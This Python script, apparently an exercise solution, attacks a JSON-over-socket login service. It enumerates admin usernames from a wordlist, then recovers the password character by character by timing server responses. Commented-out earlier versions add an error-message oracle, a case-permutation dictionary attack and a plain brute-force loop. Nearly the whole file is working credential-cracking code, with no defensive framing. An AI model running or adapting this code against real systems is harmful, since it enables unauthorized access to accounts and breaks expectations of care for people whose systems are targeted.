from datetime import datetime
from json import loads
from json import dumps
from socket import socket
from string import ascii_letters
from string import digits
from sys import argv

SUCCESS = 'Connection success!'
EXCEPTION_DURING_LOGIN = 'Exception happened during login'
WRONG_PASSWORD = 'Wrong password!'


def login_generator(filename='logins.txt'):
    """login_generator() --> Yields typical admin logins fetched from file
    Parameters:
    filename:   name of file with admin logins. Defaults to 'logins.txt'
    """
    with open(filename, 'rt') as f:
        for s in f:
            s = s.strip()
            yield s


def get_server_response(msg_dict):
    """get_server_response(msg_dict) --> Returns a dictionary with login result
    loaded from json response from the server
    Parameters:
    msg_dict:   dictionary with login & password for json body of socket request
    """
    json_msg = dumps(msg_dict)
    client_socket.send(json_msg.encode())
    json_response = client_socket.recv(1024).decode()
    return loads(json_response)


# reading cli arguments
args = argv
if len(args) != 3:
    print('The script should be called with two arguments: hostname & port')
    exit(1)
host, port = argv[1:]
address = (host, int(port))

# creating socket, sending server requests and parsing responses
response = {}
with socket() as client_socket:
    client_socket.connect(address)

    # identifying login
    login = blank_password = ' '
    for login_guess in login_generator():
        msg = {'login': login_guess, 'password': blank_password}
        response = get_server_response(msg)
        if response['result'] == WRONG_PASSWORD:
            login = login_guess
            break

    # identifying password
    pwd_root = ''
    chars = ascii_letters + digits
    while response['result'] != SUCCESS:
        delay_dict = {}
        for char in chars:
            password_guess = pwd_root + char
            msg = {'login': login, 'password': password_guess}
            start_time = datetime.now()
            response = get_server_response(msg)
            end_time = datetime.now()
            diff_period = end_time - start_time
            delay_dict[char] = diff_period
            if response['result'] == SUCCESS:
                break
        else:
            pwd_root += max(delay_dict, key=delay_dict.get)

    print(dumps(msg))





# from json import loads
# from json import dumps
# from socket import socket
# from string import ascii_letters
# from string import digits
# from sys import argv
# from datetime import datetime
#
# SUCCESS = 'Connection success!'
# EXCEPTION_DURING_LOGIN = 'Exception happened during login'
# WRONG_PASSWORD = 'Wrong password!'
#
#
# def login_generator():
#     with open('logins.txt', 'rt') as f:
#         for s in f:
#             s = s.strip()
#             yield s
#
#
# def get_server_response(msg_dict):
#     json_msg = dumps(msg_dict)
#     client_socket.send(json_msg.encode())
#     json_response = client_socket.recv(1024).decode()
#     return loads(json_response)
#
#
# # reading cli arguments
# args = argv
# if len(args) != 3:
#     print('The script should be called with two arguments: hostname & port')
#     exit(1)
# host, port = argv[1:]
# address = (host, int(port))
#
# # creating socket, sending server requests and parsing responses
# response = {}
# with socket() as client_socket:
#     client_socket.connect(address)
#
#     # identifying login
#     login = ' '
#     blank_password = ' '
#     for login_guess in login_generator():
#         msg = {'login': login_guess, 'password': blank_password}
#         response = get_server_response(msg)
#         if response['result'] == WRONG_PASSWORD:
#             login = login_guess
#             break
#
#     # identifying password
#     pwd_root = ''
#     chars = ascii_letters + digits
#     while response['result'] != SUCCESS:
#         for char in chars:
#             password_guess = pwd_root + char
#             msg = {'login': login, 'password': password_guess}
#             response = get_server_response(msg)
#             if response['result'] == SUCCESS:
#                 break
#             elif response['result'] == EXCEPTION_DURING_LOGIN:
#                 pwd_root = password_guess
#                 break
#
#     print(dumps(msg))




    # with socket.socket() as client_socket, \
    #         open('passwords.txt', 'r', encoding="utf-8") as passwords:
    #
    #     address = (hostname, port)
    #     client_socket.connect(address)
    #
    #     for password in passwords:
    #         combined_words = map(lambda x: ''.join(x),
    #                        itertools.product(*([letter.lower(), letter.upper()] for letter in password.strip())))
    #
    #         for data in combined_words:
    #             client_socket.send(data.encode())
    #             response = client_socket.recv(1024)
    #             response = response.decode()
    #             if response == 'Connection success!':
    #                 print(data)
    #                 exit(0)

    # msg_length = 0
    # while True:
    #     msg_length += 1
    # for msg_tuple in product(chars, repeat=msg_length):
    #     msg = ''.join(msg_tuple)
    #     client_socket.send(msg.encode())
    #     response = client_socket.recv(1024)
    #     if response.decode() == 'Connection success!':
    #         print(msg)
    #         exit(0)
